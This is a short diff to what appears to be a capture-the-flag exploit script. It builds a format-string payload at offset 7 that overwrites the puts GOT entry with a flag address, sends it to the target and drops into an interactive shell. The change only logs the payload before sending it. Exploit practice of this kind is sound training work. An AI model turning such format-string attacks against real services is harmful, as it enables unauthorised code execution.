@@ -11,6 +11,8 @@ tube = Pwning( target )
 
 fsb = FSB(7) #7 is offset
 fsb.rewrite(got_puts, addr_flag)
+payload = fsb.get()
 
-tube.sendline(fsb.get())
+info_pay(payload)
+tube.sendline(payload)
 tube.shell()
